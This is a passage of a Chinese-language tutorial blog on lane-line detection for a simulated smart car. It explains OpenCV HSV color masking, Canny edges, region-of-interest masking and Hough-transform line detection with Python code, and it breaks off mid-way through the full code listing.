class="number">1</span> - S*(<span class="number">1</span>-C));</span><br><span class="line">        <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> : *R = V; *G = Z; *B = X; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> : *R = Y; *G = V; *B = X; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> : *R = X; *G = V; *B = Z; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> : *R = X; *G = Y; *B = V; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> : *R = Z; *G = X; *B = V; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span> : *R = V; *G = X; *B = Y; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *R = *R *<span class="number">100</span>;</span><br><span class="line">    *G = *G *<span class="number">100</span>;</span><br><span class="line">    *B = *B *<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而以上方法在opencv中都有封装，仅需要一句代码即可实现。现在我们来检测黄色线与白色线。</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图像并转换到HSV空间</span></span><br><span class="line">frame = cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 黄色线检测</span></span><br><span class="line">lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;yellow_mask.jpg&#x27;</span>,yellow_mask)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 白色线检测</span></span><br><span class="line">lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;white_mask.jpg&#x27;</span>,white_mask)</span><br></pre></td></tr></table></figure><p>运行效果如下图：</p><p><img src="/.io//white_mask.jpg"></p><p><img src="/.io//yellow_mask.jpg"></p><p>可以看到还有很大的干扰存在。主要来自于相似的颜色，因此我们还需要进行进一步的处理。</p><h3 id="2-2基于canny算子的边缘轮廓提取"><a href="#2-2基于canny算子的边缘轮廓提取" class="headerlink" title="2.2基于canny算子的边缘轮廓提取"></a>2.2基于canny算子的边缘轮廓提取</h3><p> 目前我们仅获得了行道线区域，为了后续能够方便的计算行道线角度，我们需要得到行道线具体的轮廓&#x2F;线段信息，即从区域中提取出线段。这里我们使用Canny算法实现。</p><p>Canny边缘检测是从不同视觉对象中提取有用的结构信息并大大减少要处理的数据量的一种技术，于1986年被提出，目前已广泛应用于各种计算机视觉系统。</p><p>Canny算法具体包括5个步骤：</p><ol><li><pre><code>   使用高斯滤波器，以平滑图像，滤除噪声。</code></pre></li><li><pre><code>   计算图像中每个像素点的梯度强度和方向。</code></pre></li><li><pre><code>   应用非极大值（Non-Maximum Suppression）抑制，以消除边缘检测带来的杂散响应。</code></pre></li><li><pre><code>   应用双阈值（Double-Threshold）检测来确定真实的和潜在的边缘。</code></pre></li><li><pre><code>   通过抑制孤立的弱边缘最终完成边缘检测。</code></pre></li></ol><p>具体实现细节我们不再详细剖析，在OpenCV中集成了canny算法，只需要一行代码即可实现canny边缘检测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 黄色线边缘提取</span></span><br><span class="line">yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;yellow_edge.jpg&#x27;</span>, yellow_edge)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 白色线边缘提取white</span></span><br><span class="line">white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;white_edge.jpg&#x27;</span>, white_edge)</span><br></pre></td></tr></table></figure><p>有兴趣了解canny的同学可以查看<a href="https://blog.csdn.net/sodaANDcola/article/details/119821939">这篇博客</a> ,其中运用到的正态分布、偏导、梯度与极限的知识我们都学过，可以理解。高斯核滤波也用于卷积，而实际上的卷积还会复杂一点，可以自行了解。在后面的pytorch版本我会详细解释运行原理。</p><p> 代码中200和400这两个参数表示canny算子的低、高阈值，按照opencv教程一般可以不用修改。 </p><p> 最终效果： </p><p><img src="/.io//white_edge.jpg"></p><p><img src="/.io//yellow_edge.jpg"></p><h3 id="2-3感兴趣区域-ROI-定位"><a href="#2-3感兴趣区域-ROI-定位" class="headerlink" title="2.3感兴趣区域(ROI)定位"></a>2.3感兴趣区域(ROI)定位</h3><p>在利用OpenCV对图像进行处理时，通常会遇到一个情况，就是只需要对部分感兴趣区域（Region Of Interest, ROI）进行处理。例如针对我们这个模拟平台上的智能小车任务来说，对于黄色行道线，我们只关注图像右下部分，而对于白色行道线，我们只关注图像左下部分即可。至于图像其他部分因为我们通过人工分析知道，这些区域我们并不需要处理。因此，我们只用提取图像的对应区域。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br><span class="line">    <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">    <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">        polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                (width, height),</span><br><span class="line">                                (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                             (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">    cv2.fillPoly(mask, polygon, (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">    croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">    <span class="keyword">return</span> croped_edge</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge.jpg&#x27;</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge.jpg&#x27;</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>, region_of_interest(wimg, <span class="string">&#x27;white&#x27;</span>))</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>, region_of_interest(yimg))</span><br></pre></td></tr></table></figure><p>这里定义感兴趣区域、填充感兴趣区域是使用了暴力的直接定位法，按住ctrl+函数名可以进入cv2.fillPoly查看函数的参数与具体作用。在实际应用中我们还有一些更加高级的方法来锁定感兴趣区域，但对于模拟器而言这种方法已经够用。注意这一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br></pre></td></tr></table></figure><p>edges.shape返回有三个参数，分别为高度、宽度、通道数，如rgb图像就是三通道的。但是下面我们用不到通道数的值，但解包赋值需要把返回值全部接受，因此此处用_ 暂时存放通道数。</p><p>对于如何填充矩形有兴趣的同学，可以查看<a href="https://blog.csdn.net/weixin_43525427/article/details/105317567">这篇博客</a> 。这里进行部分的转载。</p><p>一、fillConvexPoly( )函数<br>以填充矩形为例<br>我图中想填充以1、2、3、4为顶点的矩形，我就要按1、2、3、4的顺序给出坐标序列array，或者是连贯的相邻顶点顺序（比如1432，4321…）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rectangular = np.array([ [<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">740</span>], [<span class="number">4032</span>,<span class="number">740</span>], [<span class="number">4032</span>,<span class="number">0</span>] ])</span><br><span class="line">cv2.fillConvexPoly(img_gray, rectangular, (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p> 效果如下图所示<img src="/.io//20200404212500502.png" alt="在这里插入图片描述"> </p><p>那如果不按邻边顺序，如果我写成1423会如何呢？来看。</p><p> <img src="/.io//20200404213614360.png" alt="在这里插入图片描述"> </p><p>emmm， 我觉得想画五角星的画可以这样。</p><p>二、fillPoly( )函数<br>好了，上面都是基本操作，看看官方教程都可以。<br>我们玩点别的。<br>我如果想把一个矩形区域留住（拿车牌举例），剩下的填充为白色应该怎么办呢？<br>举一反三一下，两种办法：<br>（1）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cv2.fillPoly(img_gray, [rec1, rec2, rec3, rec4], (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br></pre></td></tr></table></figure><p>四个矩形，改用fillPoly（）方法。</p><p> <img src="/.io//20200404221502411.png" alt="在这里插入图片描述"> </p><p>结果如上图。</p><p>（2）非要死脑筋其实用fillConvexPoly( )也不是不可以。</p><p> <img src="/.io//2020040422244385.png" alt="在这里插入图片描述"> </p><p>画个示意图，你们懂我意思吧。</p><p>定位后，我们的图片如下所示，可以看到更加“整洁”了。</p><p><img src="/.io//white_edge_new.jpg"></p><p><img src="/.io//yellow_edge_new.jpg"></p><p>###2.4基于霍夫变换的线段检测</p><p>到目前，我们抽取出了比较精确的行道线轮廓，但是对于实际的自动驾驶任务来说还没有完成目标任务要求，我们要对行道线轮廓再进一步处理，得到行道线的具体线段信息（每条线段的起始点坐标）。本小节我们使用霍夫变换来完成这个任务。霍夫变换，英文名称Hough Transform，作用是用来检测图像中的直线或者圆等几何图形的。</p><p>具体的，一条直线的表示方法有好多种，最常见的是y&#x3D;mx+b的形式。结合我们这个任务，对于最终检测出的感兴趣区域，怎么把图片中的直线提取出来。基本的思考流程是：如果直线 y&#x3D;mx+b 在图片中，那么图片中，必需有N多点在直线上（像素点代入表达式成立），只要有这条直线上的两个点，就能确定这条直线。该问题可以转换为：求解所有的(m,b)组合。<strong>【以下是部分原理，不感兴趣的同学可以直接跳到代码】</strong></p><p>设置两个坐标系，左边的坐标系表示的是(x,y)值，右边的坐标系表达的是(m,b)的值，即直线的参数值。那么一个(x,y)点在右边对应的就是一条线，左边坐标系的一条直线就是右边坐标系中的一个点。这样，右边左边系中的交点就表示有多个点经过(k,b)确定的直线。但是，该方法存在一个问题，(m,b)的取值范围太大。</p><p> <img src="/.io//a3c0d9612c82496cbd1bdaa987971f1c.png" alt="img"> </p><p>为了解决(m,b)取值范围过大的问题，在直线的表示方面用 <em>xcosθ+ysinθ&#x3D;r</em> 的规范式代替一般表达式，参数空间变成(θ,r)，0&#x3D;&lt;θ&lt;&#x3D;2PI。这样图像空间中的一个像素点在参数空间中就是一条曲线（三角函数曲线）。</p><p> <img src="/.io//2238243e98dd8ea95315fa27848f801f.png" alt="image-20220321140942980"> </p><p> 此时，图像空间和参数空间的对应关系如下： </p><p> <img src="/.io//20200211011825716.jpg" alt="img"> </p><p>从图中可以看出，霍夫直线检测即为在参数空间中对r和theta投票的过程，得票最高者为最终的直线参数。  theta表示与直线垂直的线与x轴的夹角，那么他的取值范围就是-pi到pi ，但显然取0-pi就可以表示所有直线。</p><p>更详细的数学原理请查看<a href="https://blog.csdn.net/u013066730/article/details/123086027">这篇博客</a> ，其中涉及到笛卡尔坐标向极坐标变换(事实上是一个特殊的参数空间)的讨论，对数学感兴趣的同学可以深入了解，这里不再展示。走到这一步，流程图如下所示。</p><p>霍夫线段检测算法原理步骤如下：</p><ul><li>初始化(θ,r)空间，N(θ,r)&#x3D;0 。（N(θ,r)表示在该参数表示的直线上的像素点的个数）</li><li>对于每一个像素点(x,y)，在参数空间中找出令 xcosθ+ysinθ&#x3D;r 的(θ,r)坐标，N(θ,r)+&#x3D;1</li><li>统计所有N(θ,r)的大小，取出N(θ,r)&gt;threasold的参数 。（threadsold是预设的阈值）</li></ul><p> OpenCV中封装好了基于霍夫变换的直线检测方法HoughLinesP，下面我们就来使用它进行线段检测。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment">#角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment">#最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,</span><br><span class="line">                            rho,</span><br><span class="line">                            angle,</span><br><span class="line">                            min_thr,</span><br><span class="line">                            np.array([]),</span><br><span class="line">                            minLineLength=<span class="number">8</span>,</span><br><span class="line">                            maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br></pre></td></tr></table></figure><p>我们可以print一下lines，结果如下(此处仅作展示，后面有这一步的完整代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[[[  1  94  47  62]]</span><br><span class="line"> [[143  94 156 103]]</span><br><span class="line"> [[103  67 119  77]]</span><br><span class="line"> [[  1  86  41  60]]</span><br><span class="line"> [[101  52 158  56]]</span><br><span class="line"> [[104  69 159 100]]</span><br><span class="line"> [[  5  52  22  53]]</span><br><span class="line"> [[129  63 140  63]]</span><br><span class="line"> [[ 87  50 110  52]]</span><br><span class="line"> [[  0  88  17  77]]</span><br><span class="line"> [[ 88  55 134  89]]</span><br><span class="line"> [[  2  94  36  70]]</span><br><span class="line"> [[ 17  50  29  50]]</span><br><span class="line"> [[ 23  73  42  60]]</span><br><span class="line"> [[ 90  56 110  70]]</span><br><span class="line"> [[  1  56  16  51]]</span><br><span class="line"> [[128  55 148  56]]</span><br><span class="line"> [[  0  89   8  84]]</span><br><span class="line"> [[ 88  56 112  75]]</span><br><span class="line"> [[151 101 159 104]]</span><br><span class="line"> [[ 30  73  43  61]]]</span><br></pre></td></tr></table></figure><p>返回的每组值都是一条线段表示线段起始位置(x_start,y_start,x_end,y_end)。可以看到小线段很多，我们对这些小线段做一下聚类和平均： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    fits = []</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br></pre></td></tr></table></figure><p>这里需要注意，由于图像的y坐标跟我们数学上经常遇到的y坐标方向是相反的（图像的y坐标轴正向是朝下的），因此，左侧黄色实线斜率是负值，右侧白色实线斜率是正值。上述代码我们将所有小线段的斜率和截距进行了平均，并且使用make_points函数重新计算了该平均线对应到图像上的起始坐标位置，make_points函数如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br></pre></td></tr></table></figure><p>上述函数最后返回的是坐标数值，这样看线段的坐标值不是很直观，我们可以写个脚本显式的观察这些线段： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br></pre></td></tr></table></figure><p>上述代码我们将行道线按照一定权重与原图进行合成，方便我们查看最终效果。 </p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment"># 角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment"># 最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=<span class="number">8</span>,maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    <span class="comment">#height, width , _= frame.shape</span></span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    